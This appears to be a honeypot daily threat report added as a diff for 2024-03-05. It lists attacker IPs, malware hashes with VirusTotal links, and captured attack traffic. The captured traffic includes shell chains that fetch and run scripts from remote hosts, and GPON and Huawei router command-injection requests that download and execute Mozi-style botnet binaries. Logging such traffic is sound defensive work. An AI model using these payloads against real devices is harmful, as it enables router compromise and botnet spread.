@@ -1,0 +1,51 @@
+Top 5 IPs for 2024-03-05 :
+
+122.226.191.252
+213.6.101.86
+218.29.231.106
+110.182.242.201
+185.216.67.45
+
+Malware Download:
+e910131a739f12b8c3acf4f74fb251e5ea6e1376dfd159ff960a496c4216d845
+https://www.virustotal.com/gui/file/e910131a739f12b8c3acf4f74fb251e5ea6e1376dfd159ff960a496c4216d845
+23a1f1383173fdceba58cb4a723b5911f1cd932dcf3d0740eda9dfdb43c8610a
+https://www.virustotal.com/gui/file/23a1f1383173fdceba58cb4a723b5911f1cd932dcf3d0740eda9dfdb43c8610a
+368db826e005f6314108ccb511f13fbf72d72c28052505c74275573b8d19dc7e
+https://www.virustotal.com/gui/file/368db826e005f6314108ccb511f13fbf72d72c28052505c74275573b8d19dc7e
+
+
+
+Malcious Commands seen:
+cd /data/local/tmp/; busybox wget http://103.78.0.41/w.sh; sh w.sh; curl http://103.78.0.41/c.sh; sh c.sh; wget http://103.78.0.41/wget.sh; sh wget.sh; curl http://103.78.0.41/wget.sh; sh wget.sh; busybox wget http://103.78.0.41/wget.sh; sh wget.sh; busybox curl http://103.78.0.41/wget.sh; sh wget.sh
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://182.112.101.147:43492/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
+
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\nContent-Length: 458\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 85.217.144.136  -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
+
+
+GET /w.sh HTTP/1.1
+Host: 193.124.205.30
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /c.sh HTTP/1.1
+Host: 193.124.205.30
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
